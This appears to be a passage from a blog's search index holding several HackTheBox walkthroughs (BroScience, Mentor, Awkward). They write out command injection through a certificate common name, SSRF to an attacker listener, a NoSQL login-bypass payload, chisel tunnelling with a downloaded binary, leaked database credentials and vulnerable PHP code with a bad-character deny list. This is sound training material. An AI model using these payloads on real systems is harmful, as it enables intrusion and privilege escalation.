-days 365 \u003c\u003c\u003c\"$country $state $locality $organization $organizationUnit $commonName $emailAddress \" 2\u003e/dev/null /bin/bash -c \"mv /tmp/temp.crt /home/bill/Certs/$commonName.crt\" else echo \"File doesn't exist\" exit 1; Here’s what process spy shows us: 2023/01/29 01:58:01 CMD: UID=0 PID=104166 | /usr/sbin/CRON -f 2023/01/29 01:58:01 CMD: UID=0 PID=104170 | /bin/bash /opt/renew_cert.sh /home/bill/Certs/broscience.crt 2023/01/29 01:58:01 CMD: UID=0 PID=104169 | timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt 2023/01/29 01:58:01 CMD: UID=0 PID=104168 | /bin/bash /root/cron.sh 2023/01/29 01:58:01 CMD: UID=0 PID=104167 | /bin/sh -c /root/cron.sh 2023/01/29 01:58:01 CMD: UID=0 PID=104171 | /usr/bin/rm -r /home/bill/Certs/* 2023/01/29 01:58:01 CMD: UID=0 PID=104172 | /usr/bin/rm -r /home/bill/Certs/. /home/bill/Certs/.. So based on the bash script and pspy output above - the following appears to happen: a cron job runs, passing the file path /home/bill/Certs/broscience.crt to /opt/renew_cert.sh if the file exists, the script runs openssl x509 -in $1 -noout -checkend 86400 \u003e /dev/null the script exits on a zero response (i.e. cert hasn’t expired). Otherwise, we extract the subject from the certificate file with openssl x509 -in $1 -noout -subject | cut -d \"=\" -f2- We extract out other cert information we use openssl to generate a new certificate to /tmp/temp.crt We copy the temp cert back to /home/bill/Certs/$commonName.crt with /bin/bash -c \"mv /tmp/temp.crt /home/bill/Certs/$commonName.crt\" I took a copy of the above script to play around with locally, and tried command injection on a certificate until I found the common name field works – here, we set a cert with 1 day expiry, and do command substitution of $(id) for common name, which we can see runs when the renew script executes: $openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 1 Generating a RSA private key .........................................++++ .........................................................................................................................++++ writing new private key to '/tmp/temp.key' ----- You are about to be asked to enter information that will be incorporated into your certificate request. What","date":"2023-04-08","objectID":"/2023-04-08-broscience-htb/:4:0","tags":["htb","security","penetration testing","ctf","php","deserialization","injection"],"title":"BroScience HTB Walkthrough","uri":"/2023-04-08-broscience-htb/"},{"categories":null,"content":"Conclusion Initial LFI and filter bypass was fairly obvious when enumerating given the ‘Error: attack detected’ error messages the web server was returning. I definitely lost a reasonable amount of time trying to work out how to register and activate a user, and somehow overlooked the srand(time()); call to seed randomness from the current time – a new attack I had not encountered until now in CTFs. Additionally, PHP object injection was entirely new to me, and I misunderstood the serialisation/deserialisation process until I played with the relevant code locally. With RCE out of the way, escalating to the bill user account was easy, and the subsequent escalation to root was also fairly straight forward once I again played with the vulnerable script locally and crafted a payload. A fun machine where the path was not too unclear and I avoided rabbit holes, but learnt to slow down and understand concepts first. Playing with vulnerable scripts and replicating bugs/attacks locally is hugely beneficial in this regard. ","date":"2023-04-08","objectID":"/2023-04-08-broscience-htb/:5:0","tags":["htb","security","penetration testing","ctf","php","deserialization","injection"],"title":"BroScience HTB Walkthrough","uri":"/2023-04-08-broscience-htb/"},{"categories":null,"content":"Introduction As you’ll see, we get to visit SNMP enumeration (not once, but twice!) and deal with a flaky web server which we fail to enumerate initially. Once the web server is accessible after a well deserved break, we manage to find some APIs to enumerate eventually leading to command injection and a reverse shell. It’s here we realise we’re in a fairly minimal Docker container with not many tools at our disposal. We look through the code of the running Flask app, finding a hard coded PostgreSQL connection string. Next, we learn to tunnel Postgres connections through our Docker container using chisel. This lets us gain a foothold on the Docker host where we are able to then privesc to get the root flag. ","date":"2023-03-11","objectID":"/2023-03-11-mentor/:1:0","tags":["htb","security","penetration testing","ctf","snmp","docker","python"],"title":"Mentor HTB Walkthrough","uri":"/2023-03-11-mentor/"},{"categories":null,"content":"Enumeration As per usual, we start with an nmap scan to see which common ports/services are accessible: $nmap -sC -sV -o nmap/initial 10.10.11.193 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-12 17:13 AEDT Nmap scan report for 10.10.11.193 Host is up (0.023s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 c73bfc3cf9ceee8b4818d5d1af8ec2bb (ECDSA) |_ 256 4440084c0ecbd4f18e7eeda85c68a4f7 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://mentorquotes.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.03 seconds I next added 10.10.11.193 mentorquotes.htb to /etc/hosts, but could not navigate to http://mentorquotes.htb Running gobuster, which found nothing, it appears once opening port 80, no data is returned whatsoever by the server. It was here I felt a little stuck, but as I found out later, the web server was flaky thanks to people enumerating and hammering it with requests – which was fixed by a reboot. Before I realised how screwy the web server was, I dug deep thinking I was missing something, and next ran a UDP scan which showed SNMP running. Simple Network Management Protocol (SNMP) is a network protocol used for monitoring and managing network devices, OSes and basically whatever other device or service may support SNMP. Using nmap, we see SNMP is indeed running on our target, and accessible via the ‘public’ community string: $sudo nmap -sUV -F 10.10.11.193 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-12 17:27 AEDT Nmap scan report for mentorquotes.htb (10.10.11.193) Host is up (0.020s latency). Not shown: 59 closed udp ports (port-unreach), 40 open|filtered udp ports (no-response) PORT STATE SERVICE VERSION 161/udp open snmp SNMPv1 server; net-snmp SNMPv3 server (public) Service Info: Host: mentor Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 224.00 seconds SNMP consists of a hierarchical namespace known as a management information base (MIB). The namespace consists of Object IDs (OIDs), each of which is a variable that can either be read (get) or written (set) – assuming the correct permissions are given, of course. The OID notation consist of numbers separated by a dot/period. We can use braa to enumerate SNMP – using the OID prefix 1.3.6.1, which is iso.org.dod.internet (common for most devices). This will effectively go through and get each OID one by one, or ‘walk’ the OID tree, providing us information about the target. We assume the community string ‘public’ here, which is used like a password to access SNMP. Ideally, you should not be using well known default community strings when relying on SNMP. With this in mind, let’s enumerate everything under 1.3.6.1.*: $braa public@10.10.11.193:.1.3.6.1.* 10.10.11.193:21ms:.0:Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64 10.10.11.193:20ms:.0:.10 10.10.11.193:30ms:.0:8641015 10.10.11.193:52ms:.0:Me \u003cadmin@mentorquotes.htb\u003e 10.10.11.193:21ms:.0:mentor 10.10.11.193:21ms:.0:Sitting on the Dock of the Bay 10.10.11.193:21ms:.0:72 10.10.11.193:20ms:.0:2 10.10.11.193:21ms:.1:.1 10.10.11.193:21ms:.2:.1 10.10.11.193:25ms:.3:.1 10.10.11.193:20ms:.4:.1 10.10.11.193:21ms:.5:.1 10.10.11.193:20ms:.6:.49 10.10.11.193:21ms:.7:.50 10.10.11.193:26ms:.8:.4 10.10.11.193:26ms:.9:.3 10.10.11.193:25ms:.10:.92 10.10.11.193:20ms:.1:The SNMP Management Architecture MIB. 10.10.11.193:21ms:.2:The MIB for Message Processing and Dispatching. 10.10.11.193:21ms:.3:The management information definitions for the SNMP User-based Security Model. 10.10.11.193:21ms:.4:The MIB module f","date":"2023-03-11","objectID":"/2023-03-11-mentor/:2:0","tags":["htb","security","penetration testing","ctf","snmp","docker","python"],"title":"Mentor HTB Walkthrough","uri":"/2023-03-11-mentor/"},{"categories":null,"content":"Foothold Given the helpful swagger UI above, we’ve gone some distance with enumeration, can we gain more access via the API? I POSTed to /auth/signup in order to create an account, which gave me a 201 (created) response: { \"email\": \"foo@bar.com\", \"username\": \"foobar\", \"password\": \"foobarbaz\" } Now, logging in – I adapted the curl command swagger UI generates, adding in the Host header: $curl -X 'POST' 'http://mentorquotes.htb/auth/login' -H 'accept: application/json' -H 'Content-Type: application/json' -H 'Host: api.mentorquotes.htb' -d '{ \"email\": \"foo@bar.com\", \"username\": \"foobar\", \"password\": \"foobarbaz\" }' \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImZvb2JhciIsImVtYWlsIjoiZm9vQGJhci5jb20ifQ.Q2yx8BqrikpPRF6hVz1BTgOLvzUODVUW0FvcsrYfBhs\" We get a JWT back for our session. I tried using the JWT in the Authorization header field to get users from within BurpSuite: GET /users/ HTTP/1.1 Host: api.mentorquotes.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: application/json Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://api.mentorquotes.htb/users/4 Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImZvb2JhciIsImVtYWlsIjoiZm9vQGJhci5jb20ifQ.Q2yx8BqrikpPRF6hVz1BTgOLvzUODVUW0FvcsrYfBhs DNT: 1 Connection: close Okay, it appears our JWT works, but we obviously don’t have the required admin privilege: HTTP/1.1 403 Forbidden Date: Sun, 19 Feb 2023 06:03:27 GMT Server: uvicorn content-length: 54 content-type: application/json Connection: close {\"detail\":\"Only admin users can access this resource\"} The top of the OpenAPI spec at http://api.mentorquotes.htb/openapi.json shows a contact named james with email james@mentorquotes.htb: \"contact\": { \"name\": \"james\", \"url\": \"http://mentorquotes.htb\", \"email\": \"james@mentorquotes.htb\" }, I tried a few things here, such as signing up again, but passing \"admin\": true in the signup JSON payload and a few other variations to see if I could force the creation of an administrator account. I wasn’t successful however. Next I wondered if we could clobber this account by creating it again? This was working off the assumption the signup endpoint will do an upsert on the underlying database (so if the data already exists, it will update over the top of the existing record), and perhaps the existing user has a role in a separate table – so signing up will retain their admin permissions.. Maybe.. Hopefully.. POST /auth/signup HTTP/1.1 Host: api.mentorquotes.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: application/json Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://api.mentorquotes.htb/docs Content-Type: application/json Origin: http://api.mentorquotes.htb Content-Length: 89 DNT: 1 Connection: close Pragma: no-cache Cache-Control: no-cache { \"email\": \"james2@mentorquotes.htb\", \"username\": \"james\", \"password\": \"foobarbaz\" } This gave a 201 (created) response, so we try logging in, and we get a token!: POST /auth/login HTTP/1.1 Host: api.mentorquotes.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: application/json Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://mentorquotes.htb/docs Content-Type: application/json Origin: http://mentorquotes.htb Content-Length: 90 DNT: 1 Connection: close { \"email\": \"james2@mentorquotes.htb\", \"username\": \"james\", \"password\" :\"foobarbaz\" } HTTP/1.1 200 OK Date: Sun, 19 Feb 2023 06:36:46 GMT Server: uvicorn content-length: 155 content-type: application/json access-control-allow-origin: * access-control-allow-credentials: true Connection: close \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lczJAbWVudG9ycXVvdGVzLmh0YiJ9.o7zBN7X869DZ2c68qXrSRCgeVmtRipgQgzI3hp30WNI\" Now, let’s try to hit the /admin endpoint with the above JWT: HTTP/1.1 403 Forbidden Date: Sun, 19 Feb 2023 06:39:01 GMT Server: u","date":"2023-03-11","objectID":"/2023-03-11-mentor/:3:0","tags":["htb","security","penetration testing","ctf","snmp","docker","python"],"title":"Mentor HTB Walkthrough","uri":"/2023-03-11-mentor/"},{"categories":null,"content":"Privilege Escalation As suspected above, it looks like we’re in a docker container, based on the limited environment, and the /app volume/working directory containing the application’s Dockerfile: /app # ls -la ls -la total 24 drwxr-xr-x 1 0 root 4096 Nov 10 16:00 . drwxr-xr-x 1 0 root 4096 Feb 19 05:32 .. -rw-r--r-- 1 0 root 1024 Jun 12 2022 .Dockerfile.swp -rw-r--r-- 1 0 root 522 Nov 3 12:58 Dockerfile drwxr-xr-x 1 0 root 4096 Nov 10 16:00 app -rw-r--r-- 1 0 root 672 Jun 4 2022 requirements.txt PYTHON_GET_PIP_SHA256=b86f36cc4345ae87bfd4f10ef6b2dbfa7a872fbff70608a1e43944d283fd0eee /app # cat Dockerfile FROM python:3.6.9-alpine RUN apk --update --upgrade add --no-cache gcc musl-dev jpeg-dev zlib-dev libffi-dev cairo-dev pango-dev gdk-pixbuf-dev WORKDIR /app ENV HOME /home/svc ENV PATH /home/svc/.local/bin:${PATH} RUN python -m pip install --upgrade pip --user svc COPY requirements.txt requirements.txt RUN pip install -r requirements.txt RUN pip install pydantic[email] pyjwt EXPOSE 8000 COPY . . CMD [\"python3\", \"-m\", \"uvicorn\", \"app.main:app\", \"--reload\", \"--workers\", \"100\", \"--host\", \"0.0.0.0\", \"--port\" ,\"8000\"] Poking around the app’s python files, we see a default/fallback connection string which is used in the absence of DATABASE_URL in the environment: /app/app # cat db.py .. snip .. # Database url if none is passed the default one is used DATABASE_URL = os.getenv(\"DATABASE_URL\", \"postgresql://postgres:postgres@172.22.0.1/mentorquotes_db\") Here’s where I did a very quick crash course on tunnelling, to see if I could somehow tunnel the postgres connection above through to my own machine.. We have a minimal docker container with no psql, so connecting to the postgres instance with the credentials in the connection string above is not easy without first tunnelling the connection through our own machine. I found chisel, a go-based app that allows you to tunnel TCP connections over HTTP. 0xdf’s quick chisel cheatsheet here was quite useful:Tunneling with Chisel and SSF | 0xdf hacks stuff I ran python -m 'http.server' 8888 on my machine, and wget http://10.10.14.33:8888/chisel to download the chisel binary into the container. I now run a chisel server on my Parrot VM, listening on port 6969: $./chisel server -p 6969 --reverse 2023/02/19 20:57:04 server: Reverse tunnelling enabled 2023/02/19 20:57:04 server: Fingerprint 6Zclibd5UaElkkiDQ/SX1oGWqKStwyRE0MJrh6y+ss4= 2023/02/19 20:57:04 server: Listening on http://0.0.0.0:6969 Now, back in the container: /app # ./chisel client 10.10.14.33:6969 R:5555:172.22.0.1:5432 This will connect chisel as a client back to my Parrot VM on 10.10.14.33:6969 via a HTTP connection. In a more locked down environment, you would likely select more common ports, such as 80, 443, 8080, etc (why is a container communicating out to the interwebs on port 6969?) With this outbound connection from the container to my own machine in place, the R:5555:172.22.0.1:5432 syntax above basically will set a remote listening port on 5555 on my Parrot VM, which tunnels/forwards from my machine back through to 172.22.0.1:5432 on the target (container), which is the postgres instance our container’s running application connects to. So now my Parrot VM will be listening on port 5555, tunnelled back through the outbound HTTP connection our container established via the chisel client command we ran inside the container, and finally to the postgres instance. Let’s try connecting – so from our Parrot VM, we run: $psql postgres://postgres:postgres@localhost:5555/mentorquotes_db psql (13.9 (Debian 13.9-0+deb11u1), server 13.7 (Debian 13.7-1.pgdg110+1)) Type \"help\" for help. mentorquotes_db=# \\dt List of relations Schema | Name | Type | Owner --------+----------+-------+---------- public | cmd_exec | table | postgres public | quotes | table | postgres public | users | table | postgres (3 rows) mentorquotes_db=# select * from users; id | email | username | password ----+----------------------------+-------------+------------------","date":"2023-03-11","objectID":"/2023-03-11-mentor/:4:0","tags":["htb","security","penetration testing","ctf","snmp","docker","python"],"title":"Mentor HTB Walkthrough","uri":"/2023-03-11-mentor/"},{"categories":null,"content":"Conclusion This machine was a little bit of an oddball: SNMP and a flaky web server that I was unable to enumerate initially both resulted in a substantial amount of time lost. I’ve used SNMP within both my home lab and working for an MSP before (configuring remote management software), but did not expect to have issues enumerating community strings until I found one tool that worked with SNMPv2. Apart from these two hiccups, the only other challenge was tunnelling the postgres connection – and 0xdf’s quick cheatsheet was very useful here. Another more tedious option would be to write a custom python script to run from within the container, connecting to the Postgres instance and dumping tables. Otherwise, the machine was fairly straight forward mostly requiring enumerating APIs trying to get an admin JWT in order to further enumerate authorized APIs followed by basic command injection into a backup endpoint that was easily testable before being used to gain a reverse shell. I’m looking forward to more challenges where tunnelling, pivoting, etc are involved across a larger lab simulating a proper network – and interested to see what other tooling exists in this area. What did I learn here? Well, different versions of SNMP will enumerate differently on the same device – given different community strings. Also, sometimes machines are just unreliable, which is easily forgiven. After gaining a foothold and seeing evidence of other people’s reverse shells, scripts, etc – you begin to realise how much traffic these VMs are taking which affects how (un-)responsive they are. The main take away? Regular breaks, and revisit challenges with fresh eyes. Often time heals – both physiologically (sleep!) and a reboot will restore services. It can be difficult knowing whether you’re not enumerating fully, or if a machine’s services are just unresponsive. ","date":"2023-03-11","objectID":"/2023-03-11-mentor/:5:0","tags":["htb","security","penetration testing","ctf","snmp","docker","python"],"title":"Mentor HTB Walkthrough","uri":"/2023-03-11-mentor/"},{"categories":null,"content":"Introduction A challenging machine offering a VueJS app backed by an Express API. There’s also a separate PHP web store app to exploit for privilege escalation and gaining root access on the machine. This was the next medium machine on my list to tick off in my quest to progress to more difficult boxes and gain further experience. As you’ll see, I had some fun with enumerating things, and my notes reflect this. What’s missing is the little rabbit holes I went down, and I usually leave these out unless they provide further clues / bread crumbs. My write ups are already quite lengthy, and I don’t want to bore people.. too much! Outside of some fiddly enumeration, this machine involves cookie forgery, server side request forgery, a local file inclusion attack on an API – which we use for further enumeration, a little forensics on user files to gain a foothold. With a foothold, things become a little clearer and we find a partially developed PHP web store we can view the source for and find a command injection vulnerability triggered when removing items from our cart. This gives us www-data access on the machine, and by running pspy, we see a recurring cron job running as root we are able to exploit by command injecting into the mail command. ","date":"2023-02-25","objectID":"/2023-02-25-awkward-htb/:1:0","tags":["htb","security","penetration testing","ctf","vue","php","node"],"title":"Awkward HTB Walkthrough","uri":"/2023-02-25-awkward-htb/"},{"categories":null,"content":"Enumeration As always, let’s start with an nmap scan: $nmap -sC -sV -oA nmap/initial 10.10.11.185 Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-30 19:25 AEDT Nmap scan report for 10.10.11.185 Host is up (0.022s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 72:54:af:ba:f6:e2:83:59:41:b7:cd:61:1c:2f:41:8b (ECDSA) |_ 256 59:36:5b:ba:3c:78:21:e3:26:b3:7d:23:60:5a:ec:38 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Site doesn't have a title (text/html). |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.19 seconds After adding the hat-valley.htb redirect to /etc/hosts and navigating to http://hat-valley.htb/ - we are greeted with: There is a form further down for submitting your contact details and a message, but this isn’t active – it basically seems like the site is just static content. The favicon and javascript bundle at /js/app.js indicates this is a Vue.js app. Let’s enumerate paths in gobuster with Parrot’s big.txt wordlist: $gobuster dir -u http://hat-valley.htb -w /usr/share/wordlists/dirb/big.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://hat-valley.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2023/01/30 19:31:26 Starting gobuster in directory enumeration mode =============================================================== /css (Status: 301) [Size: 173] [--\u003e /css/] /favicon.ico (Status: 200) [Size: 4286] /js (Status: 301) [Size: 171] [--\u003e /js/] /secci� (Status: 500) [Size: 1704] /static (Status: 301) [Size: 179] [--\u003e /static/] =============================================================== 2023/01/30 19:32:31 Finished =============================================================== The request above with unprintable character is a bit strange, and gives a 500 error – which could be something to investigate – does the web server barf on certain characters? In Firefox developer tools when loading the page, I notice SockJs requests to http://localhost:8080/sockjs-node/info?t=1675067935305 which obviously fail. /js/app.js also references this as the webpack-dev-server: /***/ (function(module, exports, __webpack_require__) { __webpack_require__(/*! /var/www/hat-valley.htb/node_modules/webpack/hot/dev-server.js */\"./node_modules/webpack/hot/dev-server.js\"); __webpack_require__(/*! /var/www/hat-valley.htb/node_modules/webpack-dev-server/client/index.js?http://localhost:8080\u0026sockPath=/sockjs-node */\"./node_modules/webpack-dev-server/client/index.js?http://localhost:8080\u0026sockPath=/sockjs-node\"); module.exports = __webpack_require__(/*! ./src/main.js */\"./src/main.js\"); Browsing to http://hat-valley.htb/sockjs-node shows me I can access the web socket: I searched around and played with websocat to see if I could somehow initiate a websocket, but didn’t have any luck. What we can gather is that the Vue.js app is likely running on webpack-dev-server, and contains symbols and other useful information showing us the relative paths of files for the application. So, let’s assume we’re looking at a work in progress web app. Browsing through /js/app.js again, I found references to ./src/Dashboard.vue and ./src/HR.vue /***/ \"./src/Dashboard.vue\": /*!***************************!*\\ !*** ./src/Dashboard.vue ***! \\***************************/ /*! exports provided: default */ /***/ (function(module, __webpack_exports__, __webpack_require__) { /***/ \"./src/H","date":"2023-02-25","objectID":"/2023-02-25-awkward-htb/:2:0","tags":["htb","security","penetration testing","ctf","vue","php","node"],"title":"Awkward HTB Walkthrough","uri":"/2023-02-25-awkward-htb/"},{"categories":null,"content":"Foothold Let’s try and log in with admin / foobar, and intercept the request in Burp Suite: POST /api/login HTTP/1.1 Host: hat-valley.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: application/json, text/plain, */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://hat-valley.htb/hr Content-Type: application/json Content-Length: 40 Origin: http://hat-valley.htb DNT: 1 Connection: close Cookie: token=guest Pragma: no-cache Cache-Control: no-cache {\"username\":\"admin\",\"password\":\"foobar\"} I attempted a basic login bypass with the following payload substituted into the above: { \"username\": { \"$ne\": null }, \"password\": { \"$ne\": null } } And received the following response from the web server. Not the response I was hoping for, but nonetheless, stack traces are useful in reconnaissance for seeing what framework, libraries, paths, etc are being used. TypeError [ERR_INVALID_ARG_TYPE]: The first argument must be of type string or an instance of Buffer, ArrayBuffer, or Array or an Array-like Object. Received an instance of Object\u003cbr\u003e \u0026nbsp; \u0026nbsp;at Function.from (buffer.js:330:9)\u003cbr\u003e \u0026nbsp; \u0026nbsp;at new Buffer (buffer.js:286:17)\u003cbr\u003e \u0026nbsp; \u0026nbsp;at module.exports (/var/www/hat-valley.htb/node_modules/sha256/lib/nodecrypto.js:14:12)\u003cbr\u003e \u0026nbsp; \u0026nbsp;at /var/www/hat-valley.htb/server/server.js:30:76\u003cbr\u003e \u0026nbsp; \u0026nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)\u003cbr\u003e \u0026nbsp; \u0026nbsp;at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13)\u003cbr\u003e \u0026nbsp; \u0026nbsp;at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3)\u003cbr\u003e \u0026nbsp; \u0026nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)\u003cbr\u003e \u0026nbsp; \u0026nbsp;at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15\u003cbr\u003e \u0026nbsp; \u0026nbsp;at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12) I tried a few Node and Mongo bypass techniques, and tried setting the token=admin in the Cookie header of the request. When changing this in my browser and refreshing the page (without actually submitting to the login api), I was presented with a dashboard: I notice a list of URLs in dev tools, and if I filter on XHR, I see: The store status URL is http://hat-valley.htb/api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb%22, which gives me a 200 okay with no response: $curl -v \"http://hat-valley.htb/api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb%22\" * Trying 10.10.11.185:80... * Connected to hat-valley.htb (10.10.11.185) port 80 (#0) \u003e GET /api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb%22 HTTP/1.1 \u003e Host: hat-valley.htb \u003e User-Agent: curl/7.87.0 \u003e Accept: */* \u003e * Mark bundle as not supporting multiuse \u003c HTTP/1.1 200 OK \u003c Server: nginx/1.18.0 (Ubuntu) \u003c Date: Mon, 30 Jan 2023 10:38:06 GMT \u003c Content-Length: 0 \u003c Connection: keep-alive \u003c x-powered-by: Express \u003c access-control-allow-origin: * \u003c * Connection #0 to host hat-valley.htb left intact Changing the url query param in the above to point at my own machine, while running a basic python HTTP server locally, I see the app does indeed hit my web server: $sudo python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.185 - - [30/Jan/2023 21:41:48] \"GET / HTTP/1.1\" 200 - The web server also serves up the index.html here (that’s an empty iframe attempting to unsuccessfully load /etc/passwd): Browsing to http://store.hat-valley.htb/ from my own machine, I get a login prompt I thought perhaps when retrieving the URL in the query param, maybe the server sets basic auth headers – so I tried listening on netcat and going to http://hat-valley.htb/api/store-status?url=%22http://10.10.14.17%22, hoping to capture some headers: $sudo nc -lvnp 80 listening on [any] 80 ... connect to [10.10.14.17] from (UNKNOWN) [10.10.11.185] ","date":"2023-02-25","objectID":"/2023-02-25-awkward-htb/:3:0","tags":["htb","security","penetration testing","ctf","vue","php","node"],"title":"Awkward HTB Walkthrough","uri":"/2023-02-25-awkward-htb/"},{"categories":null,"content":"Privilege Escalation Looking at the output of ps auxfe, the main thing that stands out is nginx running as root, with two worker processes running as www-data: root 1370 0.0 0.0 55196 1764 ? Ss Feb03 0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on; www-data 1372 0.1 0.1 56468 7120 ? S Feb03 2:04 \\_ nginx: worker process www-data 1373 0.0 0.1 56344 6720 ? S Feb03 1:05 \\_ nginx: worker process As user bean, I cannot run anything as sudo. I found the following user/hash for HTTP basic auth in nginx. Initial attempts to brute force failed here: bean@awkward:/etc/nginx/conf.d$ cat .htpasswd admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1 Browsing to http://store.hat-valley.htb/, I tried admin / 014mrbeanrules!#P - which works: It’s here I started looking for dynamic behaviour. And while we can’t check out, we can add items to cart, and then remove them once in the cart: Adding item to cart: POST /cart_actions.php HTTP/1.1 Host: store.hat-valley.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://store.hat-valley.htb/shop.php Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 46 Origin: http://store.hat-valley.htb DNT: 1 Authorization: Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A= Connection: close item=1\u0026user=59ab-bdec-f4c-c29c\u0026action=add_item We also have access to the server PHP in /var/www/store and can see cart_actions.php to ascertain the behaviour and find any vulnerabilities: bean@awkward:/var/www/store$ cat cart_actions.php \u003c?php $STORE_HOME = \"/var/www/store/\"; //check for valid hat valley store item function checkValidItem($filename) { if(file_exists($filename)) { $first_line = file($filename)[0]; if(strpos($first_line, \"***Hat Valley\") !== FALSE) { return true; } } return false; } //add to cart if ($_SERVER['REQUEST_METHOD'] === 'POST' \u0026\u0026 $_POST['action'] === 'add_item' \u0026\u0026 $_POST['item'] \u0026\u0026 $_POST['user']) { $item_id = $_POST['item']; $user_id = $_POST['user']; $bad_chars = array(\";\",\"\u0026\",\"|\",\"\u003e\",\"\u003c\",\"*\",\"?\",\"`\",\"$\",\"(\",\")\",\"{\",\"}\",\"[\",\"]\",\"!\",\"#\"); //no hacking allowed!! foreach($bad_chars as $bad) { if(strpos($item_id, $bad) !== FALSE) { echo \"Bad character detected!\"; exit; } } foreach($bad_chars as $bad) { if(strpos($user_id, $bad) !== FALSE) { echo \"Bad character detected!\"; exit; } } if(checkValidItem(\"{$STORE_HOME}product-details/{$item_id}.txt\")) { if(!file_exists(\"{$STORE_HOME}cart/{$user_id}\")) { system(\"echo '***Hat Valley Cart***' \u003e {$STORE_HOME}cart/{$user_id}\"); } system(\"head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 \u003e\u003e {$STORE_HOME}cart/{$user_id}\"); echo \"Item added successfully!\"; } else { echo \"Invalid item\"; } exit; } //delete from cart if ($_SERVER['REQUEST_METHOD'] === 'POST' \u0026\u0026 $_POST['action'] === 'delete_item' \u0026\u0026 $_POST['item'] \u0026\u0026 $_POST['user']) { $item_id = $_POST['item']; $user_id = $_POST['user']; $bad_chars = array(\";\",\"\u0026\",\"|\",\"\u003e\",\"\u003c\",\"*\",\"?\",\"`\",\"$\",\"(\",\")\",\"{\",\"}\",\"[\",\"]\",\"!\",\"#\"); //no hacking allowed!! foreach($bad_chars as $bad) { if(strpos($item_id, $bad) !== FALSE) { echo \"Bad character detected!\"; exit; } } foreach($bad_chars as $bad) { if(strpos($user_id, $bad) !== FALSE) { echo \"Bad character detected!\"; exit; } } if(checkValidItem(\"{$STORE_HOME}cart/{$user_id}\")) { system(\"sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}\"); echo \"Item removed from cart\"; } else { echo \"Invalid item\"; } exit; } //fetch from cart if ($_SERVER['REQUEST_METHOD'] === 'GET' \u0026\u0026 $_GET['action'] === 'fetch_items' \u0026\u0026 $_GET['user']) { $html = \"\"; $dir = scandir(\"{$STORE_HOME}cart\"); $files = array_slice($dir, 2); foreach($files as $file) { $user_id = substr($file, -18); if($user_id === $_GET['user'] \u0026\u0026 checkValidItem(\"{$STORE_HOME}cart/{$user_id}\")) { $product_file = 